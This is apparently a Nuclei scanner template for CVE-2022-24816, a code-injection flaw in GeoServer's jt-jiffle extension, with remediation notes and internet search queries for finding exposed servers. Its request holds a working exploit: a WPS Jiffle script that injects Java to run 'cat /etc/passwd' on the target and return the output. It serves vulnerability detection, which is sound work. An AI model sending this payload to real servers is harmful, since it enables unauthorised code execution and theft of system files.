id: CVE-2022-24816
info:
  name: GeoServer <1.2.2 - Remote Code Execution
  author: mukundbhuva
  severity: critical
  description: GeoServer versions prior to 1.2.2 that use jt-jiffle and allow network
    requests for Jiffle scripts are vulnerable to remote code execution through Janino-compiling
    and executing the scripts, including GeoServer 1.1.22.
  remediation: 1.2.22 contains a patch that disables the ability to inject malicious
    code into the resulting script. Users unable to upgrade may negate the ability
    to compile Jiffle scripts from the final application by removing janino-x.y.z.jar
    from the classpath.
  reference:
  - https://www.synacktiv.com/en/publications/exploiting-cve-2022-24816-a-code-injection-in-the-jt-jiffle-extension-of-geoserver.html
  - https://github.com/geosolutions-it/jai-ext/security/advisories/GHSA-v92f-jx6p-73rx
  - https://github.com/geosolutions-it/jai-ext/commit/cb1d6565d38954676b0a366da4f965fef38da1cb
  - https://nvd.nist.gov/vuln/detail/CVE-2022-24816
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-24816
    cwe-id: CWE-94
  metadata:
    fofa-query: app="GeoServer"
    shodan-query: /geoserver/
    verified: 'true'
    impact: The vulnerability CVE-2022-24816 in GeoServer <1.2.2 allows remote code
      execution, potentially impacting downstream GeoServer 1.1.22 and posing a significant
      security risk to affected systems.
    recommendation: Update to GeoServer 1.2.2 or later to mitigate the risk of remote
      code execution from a Jiffle script provided via a network request.
  tags: cve,cve2022,geoserver,rce
requests:
- raw:
  - "POST /geoserver/wms HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\n\
    \n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n  <wps:Execute version=\"1.0.0\"\
    \ service=\"WPS\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns=\"\
    http://www.opengis.net/wps/1.0.0\" xmlns:wfs=\"http://www.opengis.net/wfs\" xmlns:wps=\"\
    http://www.opengis.net/wps/1.0.0\" xmlns:ows=\"http://www.opengis.net/ows/1.1\"\
    \ xmlns:gml=\"http://www.opengis.net/gml\" xmlns:ogc=\"http://www.opengis.net/ogc\"\
    \ xmlns:wcs=\"http://www.opengis.net/wcs/1.1.1\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"\
    \ xsi:schemaLocation=\"http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd\"\
    >\n    <ows:Identifier>ras:Jiffle</ows:Identifier>\n    <wps:DataInputs>\n   \
    \   <wps:Input>\n        <ows:Identifier>coverage</ows:Identifier>\n        <wps:Data>\n\
    \          <wps:ComplexData mimeType=\"application/arcgrid\"><![CDATA[ncols 720\
    \ nrows 360 xllcorner -180 yllcorner -90 cellsize 0.5 NODATA_value -9999  316]]></wps:ComplexData>\n\
    \        </wps:Data>\n      </wps:Input>\n      <wps:Input>\n        <ows:Identifier>script</ows:Identifier>\n\
    \        <wps:Data>\n          <wps:LiteralData>dest = y() - (500); // */ public\
    \ class Double {    public static double NaN = 0;  static { try {  java.io.BufferedReader\
    \ reader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\"\
    cat /etc/passwd\").getInputStream())); String line = null; String allLines = \"\
    \ - \"; while ((line = reader.readLine()) != null) { allLines += line; } throw\
    \ new RuntimeException(allLines);} catch (java.io.IOException e) {} }} /**</wps:LiteralData>\n\
    \        </wps:Data>\n      </wps:Input>\n      <wps:Input>\n        <ows:Identifier>outputType</ows:Identifier>\n\
    \        <wps:Data>\n          <wps:LiteralData>DOUBLE</wps:LiteralData>\n   \
    \     </wps:Data>\n      </wps:Input>\n    </wps:DataInputs>\n    <wps:ResponseForm>\n\
    \      <wps:RawDataOutput mimeType=\"image/tiff\">\n        <ows:Identifier>result</ows:Identifier>\n\
    \      </wps:RawDataOutput>\n    </wps:ResponseForm>\n  </wps:Execute>\n"
  matchers-condition: and
  matchers:
  - type: regex
    part: body
    regex:
    - 'root:.*:0:0:'
    - ExceptionInInitializerError
    condition: and
  - type: status
    status:
    - 200
